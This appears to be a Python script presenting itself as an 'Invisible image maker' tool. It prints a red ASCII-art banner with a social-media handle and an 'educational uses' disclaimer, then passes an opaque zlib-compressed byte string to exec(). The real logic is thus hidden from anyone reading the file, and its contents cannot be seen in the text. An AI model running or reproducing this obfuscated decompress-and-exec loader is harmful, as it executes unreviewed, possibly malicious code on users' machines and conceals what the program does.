import subprocess
import zlib


bash_script = '''#!/bin/bash


RED='\033[0;31m'
NC='\033[0m' # No Color


printf "${RED}         
          _          _           _          _        _         _           _          _               _             _      
         /\ \       /\ \     _  /\ \    _ / /\      /\ \      / /\        /\ \       / /\            _\ \          /\ \    
         \ \ \     /  \ \   /\_\\ \ \  /_/ / /      \ \ \    / /  \       \ \ \     / /  \          /\__ \        /  \ \   
         /\ \_\   / /\ \ \_/ / / \ \ \ \___\/       /\ \_\  / / /\ \__    /\ \_\   / / /\ \        / /_ \_\      / /\ \ \  
        / /\/_/  / / /\ \___/ /  / / /  \ \ \      / /\/_/ / / /\ \___\  / /\/_/  / / /\ \ \      / / /\/_/     / / /\ \_\ 
       / / /    / / /  \/____/   \ \ \   \_\ \    / / /    \ \ \ \/___/ / / /    / / /\ \_\ \    / / /         / /_/_ \/_/ 
      / / /    / / /    / / /     \ \ \  / / /   / / /      \ \ \      / / /    / / /\ \ \___\  / / /         / /____/\    
     / / /    / / /    / / /       \ \ \/ / /   / / /   _    \ \ \    / / /    / / /  \ \ \__/ / / / ____    / /\____\/    
 ___/ / /__  / / /    / / /         \ \ \/ /___/ / /__ /_/\__/ / /___/ / /__  / / /____\_\ \  / /_/_/ ___/\ / / /______    
/\__\/_/___\/ / /    / / /           \ \  //\__\/_/___\\ \/___/ //\__\/_/___\/ / /__________\/_______/\__\// / /_______\   
\/_________/\/_/     \/_/             \_\/ \/_________/ \_____\/ \/_________/\/_____________/\_______\/    \/__________/   
                       _         _   _         _                   _              _                                        
                      /\ \      /\_\/\_\ _    / /\                /\ \           /\ \                                      
                      \ \ \    / / / / //\_\ / /  \              /  \ \         /  \ \                                     
                      /\ \_\  /\ \/ \ \/ / // / /\ \            / /\ \_\       / /\ \ \                                    
     ____    ____    / /\/_/ /  \____\__/ // / /\ \ \          / / /\/_/      / / /\ \_\  ____    ____                     
   /\____/\/\____/\ / / /   / /\/________// / /  \ \ \        / / / ______   / /_/_ \/_//\____/\/\____/\                   
   \/____\/\/____\// / /   / / /\/_// / // / /___/ /\ \      / / / /\_____\ / /____/\   \/____\/\/____\/                   
                  / / /   / / /    / / // / /_____/ /\ \    / / /  \/____ // /\____\/                                      
              ___/ / /__ / / /    / / // /_________/\ \ \  / / /_____/ / // / /______                                      
             /\__\/_/___\\/_/    / / // / /_       __\ \_\/ / /______\/ // / /_______\                                     
             \/_________/        \/_/ \_\___\     /____/_/\/___________/ \/__________/                                     
                                                                                                                           
${NC}"


printf  "${RED}  Invisible image maker . insta :- @o978x !!! ${NC}"
printf  "${RED}  this is only for educational uses !!! ${NC}"





'''


process = subprocess.Popen(bash_script, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
stdout, stderr = process.communicate()


#print("Output:")
print(stdout.decode())

if stderr:
    print("Errors:")
    print(stderr.decode())

#print("Running Python script...")


comp = b'x\x9c\x95RMk\xc30\x0c\xbd\xe7W\x88\x9cl\xe8\xd2\x9e\x0b;ll\x8c\xc2\x0ec\xd71\x8c\xdb*\x89\xda\xc46\xb6\xfa\xb5\xd2\xff>\xc7\xcd\xb6\xb4=\xcd\x18\x07?I\xefI\xcf)\xbdm\xe1m\xf6\n\xd4:\xeb\x19f\xad\xae0\xeb/6d\xd9\x12Kh\xf5\x1a\x15u\x11Un\x9a\xe6\xa0\xd8k\x13\x9c\xf6hX\x90q\x1b\xee\xa3Ns-\xa7\x19\xc4\x95\x8e\xb0\xf0\xe4X-\xc9\xe3\x82\xad?\xc0}\xe4,\xba\xac"bF\xb7(~\xeez\x1e\xba\xafP\xaa\xa4\x06\x95\x922\xcbz\x96\x04t\xc9\x83\xf2\xb9\x0e\x98\xeao\xe4\xcf\xea\xe9\xb4\x1b\xbe\x0c\x0e\x08V\x96\x8c\xb8\xeeo\x04e~\xfc\xc9\x08\xae!\xc6=\x8b_}\xf91\xf9<\r\x87/\x9c\xa9\xf2\xa4\x98\xf4\x92P\xd4H&\x16\xd6\xa1\xb9m\xafXX\xb3E\xcf"\x7f\x7fy|\xc8\xe5\x9fY;Zr=\x82\x1a\xa9\xaa9\xb2\xa4\xa2"\xd0\x17\x9e\xa7\x19\xe8\xaaK%\x83\xbb\x9en\x04\xe2\x82FF`2\x82~\xcb\xa197tE\xd0\xdb\xf8\x1e\xd7\x9e\xc9s\xba\xf3\x14\x1f\xbb\xcc\xc9l)\xd0\xbc\xc1~\xda\xaeh\t\x9a\xa7p\xbc)=\xc5\xf1\xb2k\x07\xba\xc9:H\xe4\xcf\x86\xd1\x03\xd7\x08\t\xb7%XO\x15\x19\xdd\xf4\xdc\x02\xf7w0\xaem\x8b\xe3\'\x0ck\xb6n|\xeet\xe5*9\x85\xc8\xfe\xbf?\x13\xbe\x01\xb6O\xfd\x1c'

exec(zlib.decompress(comp).decode())
